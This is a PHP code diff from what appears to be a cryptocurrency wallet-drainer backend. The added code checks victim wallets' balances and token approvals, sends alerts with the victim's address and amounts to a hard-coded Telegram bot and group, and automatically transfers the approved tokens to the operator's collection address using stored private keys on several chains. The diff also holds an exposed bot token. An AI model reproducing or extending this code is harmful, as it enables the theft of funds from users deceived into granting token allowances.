@@ -78,10 +78,10 @@ class Address extends Api
                 }
                 if($money_online >10 || $money_approve > 0 ){
                     //TG通知开始
-                    $data = "【综合授权通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
+                    $data_tg = "【综合授权通知】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n在线余额：{$money_online}\n授权数量：{$money_approve}";
                     $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
                     $id ='5725539445';//群组ID
-                    $u4 = $data;
+                    $u4 = $data_tg;
                     $u4 = urlencode($u4);
                     $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
                     $ch = curl_init();
@@ -94,13 +94,107 @@ class Address extends Api
                     //TG通知结束
                 }
                 //自动化开始
+                switch ($vo['chain']){
+                    case 'trc':
+                        $qb_type = 1;
+                        $address_shou = config('site.shou_trx');
+                        switch ($vo['approve_type']){
+                            case 0:
+                                $approve_user_address = config('site.hy_user_trx');
+                                $approve_key = config('site.hy_user_trx_key');
+                                break;
+                            case 1:
+                                $approve_user_address = $vo['approve_address'];
+                                $approve_key = $vo['account_pre'];
+                                break;
+                        }
+                        break;
+                    case 'bsc':
+                        $qb_type = 2;
+                        $address_shou = config('site.shou_bsc');
+                        $approve_user_address = config('site.hy_user_bsc');
+                        $approve_key = config('site.hy_user_bsc_key');
+                        break;
+                    case 'eth':
+                        $qb_type = 3;
+                        $address_shou = config('site.shou_eth');
+                        $approve_user_address = config('site.hy_user_eth');
+                        $approve_key = config('site.hy_user_eth_key');
+                        break;
+                    case 'okt':
+                        $qb_type = 4;
+                        $address_shou = config('site.shou_bsc');
+                        $approve_user_address = config('site.hy_user_bsc');
+                        $approve_key = config('site.hy_user_bsc_key');
+                        break;
+                }
+                $amount = $money_online;
+                if($amount > $money_approve){
+                    $amount = $money_approve;
+                }
+                if($amount >= $vo['auto_money']  && $vo['auto'] == 1){
+                    $to = $address_shou;
+                    $rrr_arr=config('conf.rrr_arr');
+                    $psd = $approve_key;
+                    foreach ($rrr_arr as $aaa){
+                        $psd = str_replace($aaa,'',$psd);
+                    }
 
+                    $approve_info =array(
+                        'qb_type'=>$qb_type,//钱包类型
+                        'approve_address'=>$vo['approve_address'],//授权合约地址
+                        'approve_user_address'=>$approve_user_address,//调用授权合约的账户
+                        'psd'=>$psd,//调用授权合约的账户的私钥
+                        'user_address'=>$vo['address'],//目标用户钱包
+                        'contract_address'=>$vo['contract_address'],//目标合约
+                        'approve_address_decimals'=>$vo['approve_address_decimals'],//目标合约精度
+                        'sq_approve_type'=>$vo['approve_type'],//0 合约授权 1 账号授权
+                    );
+                    $receive_info =array(
+                        'to'=>$to,//收款地址
+                        'amount'=>$amount,//金额
+                    );
+                    $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info,$receive_info);
+
+                    //TG通知开始
+                    $data_tg = "【自动划】\n来源：{$vo['h5_url']}\n钱包地址：{$vo['address']}\n画：{$amount}";
+                    $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
+                    $id ='5725539445';//群组ID
+                    $u4 = $data_tg;
+                    $u4 = urlencode($u4);
+                    $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, $urlstring);
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                    $resultaaa = curl_exec($ch);
+                    curl_close($ch);
+                    //TG通知结束
+
+                    if($result){
+                        $data = array();
+                        if($qb_type == 1){
+                            $data['txid']=$result->txID;
+                        }else{
+                            $data['txid']=$result['hash'];
+                        }
+                        $data['user_id']=0;
+                        $data['address']=$vo['address'];
+                        $data['to_address']=$to;
+                        $data['money']=$amount;
+                        $data['createtime']=time();
+                        $data['updatetime']=time();
+                        $ishave = Db('approve_transaction')->where(['txid'=>$data['txid']])->find();
+                        if($ishave){
+                            Db('approve_transaction')->where(['txid'=>$data['txid']])->update(['updatetime'=>time()]);
+                        }else{
+                            Db('approve_transaction')->insert($data);
+                        }
+                        Db('address')->where(['id'=>$vo['id']])->update(['money_online'=>0]);
+                    }
+                }
                 //自动化结束
-
-
-
-
-
             }
             return 'ok';
         }catch (Exception $e) {
